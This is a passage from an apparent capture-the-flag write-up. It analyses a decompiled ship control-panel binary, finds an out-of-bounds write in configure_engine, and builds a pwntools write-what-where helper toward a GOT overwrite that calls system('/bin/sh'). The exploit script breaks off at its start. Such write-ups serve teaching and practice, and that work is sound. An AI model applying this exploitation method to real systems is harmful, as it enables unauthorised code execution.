<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk8">log_message</span><span class="mtk1">(</span><span class="mtk6">3</span><span class="mtk1">, </span><span class="mtk4">"Only the captain is allowed to change the ship</span><span class="mtk6">\'</span><span class="mtk4">s route</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>  
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (canary </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">)) {</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
<span class="mtk1">    </span><span class="mtk8">__stack_chk_fail</span><span class="mtk1">();</span>
<span class="mtk1">  }</span>
<span class="mtk1">}</span>
</code></pre></div><p>This function allows us to enter any information in a global variable called <code>route</code>. In my opinion, this is not very useful.</p><p>This is <code>view_route</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">view_route</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> i;</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (curr_user </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">100</span><span class="mtk1">) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"&lt;===[ Route ]===&gt;"</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> (i </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; i </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">4</span><span class="mtk1">; i </span><span class="mtk5">=</span><span class="mtk1"> i </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) {</span>
<span class="mtk1">      </span><span class="mtk8">print_coordinates</span><span class="mtk1">(i);</span>
<span class="mtk1">    }</span>
<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk8">log_message</span><span class="mtk1">(</span><span class="mtk6">3</span><span class="mtk1">,</span><span class="mtk4">"Only the captain is allowed to view the ship</span><span class="mtk6">\'</span><span class="mtk4">s route.</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>  
<span class="mtk1">  }</span>
<span class="mtk1">}</span>
</code></pre></div><p>It uses <code>print_coordinates</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">print_coordinates</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk9 mtki">param_1</span><span class="mtk1">) {</span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"&lt;===[ Coordinates [</span><span class="mtk6">%d</span><span class="mtk4">] ]===&gt;</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, (ulong) (param_1 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">));</span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\t</span><span class="mtk4">Latitude  : </span><span class="mtk6">%ld\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">*</span><span class="mtk1">(undefined8 </span><span class="mtk5">*</span><span class="mtk1">) (route </span><span class="mtk5">+</span><span class="mtk1"> (</span><span class="mtk7 mtki">long</span><span class="mtk1">) param_1 </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">));</span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\t</span><span class="mtk4">Longitude : </span><span class="mtk6">%ld\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">*</span><span class="mtk1">(undefined8 </span><span class="mtk5">*</span><span class="mtk1">) (route </span><span class="mtk5">+</span><span class="mtk1"> (</span><span class="mtk7 mtki">long</span><span class="mtk1">) param_1 </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">));</span>  
<span class="mtk1">}</span>
</code></pre></div><p>Basically it prints what we entered in <code>route</code>. Again, it is not very useful:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-white">Option [1-5]: </span>3
selection: 3
&lt;===[ Coordinates [1] ]===&gt;
        Latitude  : 1234
        Longitude : 4321
&lt;===[ Coordinates [2] ]===&gt;
        Latitude  : 2345
        Longitude : 5432
&lt;===[ Coordinates [3] ]===&gt;
        Latitude  : 3456
        Longitude : 6543
&lt;===[ Coordinates [4] ]===&gt;
        Latitude  : 4567
        Longitude : 7654

Do you want to save the route? (y/n)
&gt; y
[<span class="code-dark-green">+</span>] The route has been successfully updated!  


<span class="code-dark-red">┌───────────────┬────────┐</span>
<span class="code-dark-red">│ Control Panel │ 9A0:F3 │</span>
<span class="code-dark-red">├───────────────┴────────┤</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">│ Technician:            │</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">│ 1. Configure Engine    │</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">│ 2. Check Engine        │</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">│ Captain:               │</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">│ 3. Set route           │</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">│ 4. View route          │</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">│ 5. Change roles        │</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">└────────────────────────┘</span>

[<span class="code-dark-blue">*</span>] Current Role: Captain

<span class="code-white">Option [1-5]: </span>4
selection: 4
&lt;===[ Route ]===&gt;
&lt;===[ Coordinates [1] ]===&gt;
        Latitude  : 1234
        Longitude : 4321
&lt;===[ Coordinates [2] ]===&gt;
        Latitude  : 2345
        Longitude : 5432
&lt;===[ Coordinates [3] ]===&gt;
        Latitude  : 3456
        Longitude : 6543
&lt;===[ Coordinates [4] ]===&gt;
        Latitude  : 4567
        Longitude : 7654
</code></pre></div><p>There is an option to switch role to Technician (<code>change_role</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">change_role</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> role;</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (curr_user </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">100</span><span class="mtk1">) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"&lt;===[ Available roles ]===&gt;"</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Technician: 1 | Crew: 2"</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"New role: "</span><span class="mtk1">);</span>
<span class="mtk1">    role </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">read_num</span><span class="mtk1">();</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> ((role </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) </span><span class="mtk5">||</span><span class="mtk1"> (role </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">)) {</span>
<span class="mtk1">      </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (curr_user </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">100</span><span class="mtk1">) </span><span class="mtk5">=</span><span class="mtk1"> role;</span>
<span class="mtk1">      </span><span class="mtk8">log_message</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk4">"New role has been set successfully!"</span><span class="mtk1">);</span>
<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk8">log_message</span><span class="mtk1">(</span><span class="mtk6">3</span><span class="mtk1">, </span><span class="mtk4">"Invalid role."</span><span class="mtk1">);</span>
<span class="mtk1">    }</span>
<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk8">log_message</span><span class="mtk1">(</span><span class="mtk6">3</span><span class="mtk1">, </span><span class="mtk4">"Only Captain is allowed to change roles.</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>  
<span class="mtk1">  }</span>
<span class="mtk1">}</span>
</code></pre></div><h3 id="technician-options">Technician options</h3><p>So, let&rsquo;s see what options we have as Technician. This is <code>configure_engine</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">configure_engine</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">uint</span><span class="mtk1"> number;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> ret;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> newline_index;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> in_FS_OFFSET;</span>
<span class="mtk1">  undefined8 thrust;</span>
<span class="mtk1">  undefined8 mixture;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> confirmation[</span><span class="mtk6">2</span><span class="mtk1">];</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> canary;</span>

<span class="mtk1">  canary </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">);</span>
<span class="mtk1">  confirmation </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk7 mtki">char</span><span class="mtk1">  [</span><span class="mtk6">2</span><span class="mtk1">]) </span><span class="mtk5">0x</span><span class="mtk6">0</span><span class="mtk1">;</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (curr_user </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">100</span><span class="mtk1">) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">Engine number [0-</span><span class="mtk6">%d</span><span class="mtk4">]: "</span><span class="mtk1">, </span><span class="mtk6">3</span><span class="mtk1">);</span>
<span class="mtk1">    number </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">read_num</span><span class="mtk1">();</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> ((</span><span class="mtk7 mtki">int</span><span class="mtk1">) number </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">4</span><span class="mtk1">) {</span>
<span class="mtk1">      </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Engine [</span><span class="mtk6">%d</span><span class="mtk4">]: </span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, (ulong) number);</span>
<span class="mtk1">      </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\t</span><span class="mtk4">Thrust: "</span><span class="mtk1">);</span>
<span class="mtk1">      </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%ld</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">thrust);</span>
<span class="mtk1">      </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\t</span><span class="mtk4">Mixture ratio: "</span><span class="mtk1">);</span>
<span class="mtk1">      </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%ld</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">mixture);</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk8">getchar</span><span class="mtk1">();</span>
<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">Do you want to save the configuration? (y/n) "</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">&gt; "</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">fgets</span><span class="mtk1">(confirmation, </span><span class="mtk6">3</span><span class="mtk1">, stdin);</span>
<span class="mtk1">    newline_index </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">strcspn</span><span class="mtk1">(confirmation, </span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>
<span class="mtk1">    confirmation[newline_index] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">;</span>
<span class="mtk1">    ret </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">strcmp</span><span class="mtk1">(confirmation, </span><span class="mtk4">"y"</span><span class="mtk1">);</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (ret </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
<span class="mtk1">      </span><span class="mtk5">*</span><span class="mtk1">(undefined8 </span><span class="mtk5">*</span><span class="mtk1">) (engines </span><span class="mtk5">+</span><span class="mtk1"> (</span><span class="mtk7 mtki">long</span><span class="mtk1">) (</span><span class="mtk7 mtki">int</span><span class="mtk1">) number </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">) </span><span class="mtk5">=</span><span class="mtk1"> thrust;</span>
<span class="mtk1">      </span><span class="mtk5">*</span><span class="mtk1">(undefined8 </span><span class="mtk5">*</span><span class="mtk1">) (engines </span><span class="mtk5">+</span><span class="mtk1"> (</span><span class="mtk7 mtki">long</span><span class="mtk1">) (</span><span class="mtk7 mtki">int</span><span class="mtk1">) number </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">) </span><span class="mtk5">=</span><span class="mtk1"> mixture;</span>
<span class="mtk1">      </span><span class="mtk8">log_message</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk4">"Engine configuration updated successfully!</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>
<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk8">log_message</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk4">"Engine configuration cancelled.</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>
<span class="mtk1">    }</span>
<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk8">log_message</span><span class="mtk1">(</span><span class="mtk6">3</span><span class="mtk1">, </span><span class="mtk4">"Only technicians are allowed to configure the eng</span><span class="mtk4">ines"</span><span class="mtk1">);</span>  
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (canary </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">)) {</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
<span class="mtk1">    </span><span class="mtk8">__stack_chk_fail</span><span class="mtk1">();</span>
<span class="mtk1">  }</span>
<span class="mtk1">}</span>
</code></pre></div><p>We have a vulnerability right here:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">      </span><span class="mtk5">*</span><span class="mtk1">(undefined8 </span><span class="mtk5">*</span><span class="mtk1">) (engines </span><span class="mtk5">+</span><span class="mtk1"> (</span><span class="mtk7 mtki">long</span><span class="mtk1">) (</span><span class="mtk7 mtki">int</span><span class="mtk1">) number </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">) </span><span class="mtk5">=</span><span class="mtk1"> thrust;</span>
<span class="mtk1">      </span><span class="mtk5">*</span><span class="mtk1">(undefined8 </span><span class="mtk5">*</span><span class="mtk1">) (engines </span><span class="mtk5">+</span><span class="mtk1"> (</span><span class="mtk7 mtki">long</span><span class="mtk1">) (</span><span class="mtk7 mtki">int</span><span class="mtk1">) number </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">) </span><span class="mtk5">=</span><span class="mtk1"> mixture;</span>  
</code></pre></div><p>We control <code>number</code>, <code>thrust</code> and <code>mixture</code>. And <code>number</code> is treated as <code>int</code>, the only check is that <code>number &lt; 4</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">Engine number [0-</span><span class="mtk6">%d</span><span class="mtk4">]: "</span><span class="mtk1">, </span><span class="mtk6">3</span><span class="mtk1">);</span>
<span class="mtk1">    number </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">read_num</span><span class="mtk1">();</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> ((</span><span class="mtk7 mtki">int</span><span class="mtk1">) number </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">4</span><span class="mtk1">) {</span>
<span class="mtk1">      </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Engine [</span><span class="mtk6">%d</span><span class="mtk4">]: </span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, (ulong) number);</span>  
<span class="mtk1">      </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\t</span><span class="mtk4">Thrust: "</span><span class="mtk1">);</span>
<span class="mtk1">      </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%ld</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">thrust);</span>
<span class="mtk1">      </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\t</span><span class="mtk4">Mixture ratio: "</span><span class="mtk1">);</span>
<span class="mtk1">      </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%ld</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">mixture);</span>
<span class="mtk1">    }</span>
</code></pre></div><p>So, we have an out-of-bounds (OOB) write. Using this, we can write anything into arbitrary memory. Hence, we have a write-what-where primitive. We can even create a function to exploit this later:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">write_what_where</span><span class="mtk1">(</span><span class="mtk9 mtki">p</span><span class="mtk1">, </span><span class="mtk9 mtki">what</span><span class="mtk1">: </span><span class="mtk8 mtku">Tuple</span><span class="mtk1">[</span><span class="mtk8 mtku">int</span><span class="mtk1">, </span><span class="mtk8 mtku">int</span><span class="mtk1">], </span><span class="mtk9 mtki">where</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendlineafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Option [1-5]: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'1'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendlineafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Engine number [0-3]: '</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">((</span><span class="mtk9 mtki">where</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.engines) </span><span class="mtk5">//</span><span class="mtk1"> </span><span class="mtk6">16</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>  
<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendlineafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Thrust: '</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">what</span><span class="mtk1">[</span><span class="mtk6">0</span><span class="mtk1">]).</span><span class="mtk8">encode</span><span class="mtk1">())</span>
<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendlineafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Mixture ratio: '</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">what</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">]).</span><span class="mtk8">encode</span><span class="mtk1">())</span>
<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendlineafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Do you want to save the configuration? (y/n) </span><span class="mtk6">\n</span><span class="mtk4">&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'y'</span><span class="mtk1">)</span>
</code></pre></div><p>One thing to consider is that we have to modify a total of 16 bytes (<code>thrust</code> and <code>mixture</code>).</p><p>Finally, let&rsquo;s see what can we do with <code>check_engine</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">check_engines</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> i;</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (curr_user </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">100</span><span class="mtk1">) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"[===&lt; Engine Check &gt;===]"</span><span class="mtk1">);</span>

<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> (i </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; i </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">4</span><span class="mtk1">; i </span><span class="mtk5">=</span><span class="mtk1"> i </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) {</span>
<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> ((</span><span class="mtk6">100</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (engines </span><span class="mtk5">+</span><span class="mtk1"> (</span><span class="mtk7 mtki">long</span><span class="mtk1">) i </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">)) </span><span class="mtk5">||</span>
<span class="mtk1">         (</span><span class="mtk6">100</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (engines </span><span class="mtk5">+</span><span class="mtk1"> (</span><span class="mtk7 mtki">long</span><span class="mtk1">) i </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">))) {</span>
<span class="mtk1">        </span><span class="mtk8">log_message</span><span class="mtk1">(</span><span class="mtk6">3</span><span class="mtk1">, </span><span class="mtk4">"Faulty configuration found.</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">      }</span>
<span class="mtk1">      </span><span class="mtk8">log_message</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk4">"All engines are configured correctly.</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>
<span class="mtk1">    }</span>
<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk8">log_message</span><span class="mtk1">(</span><span class="mtk6">3</span><span class="mtk1">, </span><span class="mtk4">"Only technicians are allowed to check the engines</span><span class="mtk4">.</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>  
<span class="mtk1">  }</span>
<span class="mtk1">}</span>
</code></pre></div><p>Well, nothing actually useful.</p><h2 id="exploit-strategy">Exploit strategy</h2><p>Since we have a write-what-where primitive and the binary has Partial RELRO, the best technique to use is GOT overwrite. As a result, we will be messing around with the external functions of the binary.</p><p>First, we will need to leak some address within Glibc to find the base address and then call <code>system("/bin/sh")</code>.</p><h2 id="exploit-development">Exploit development</h2><p>We will start with this code to switch to Technician:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">()</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Enter a username: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">256</span><span class="mtk1">)</span>
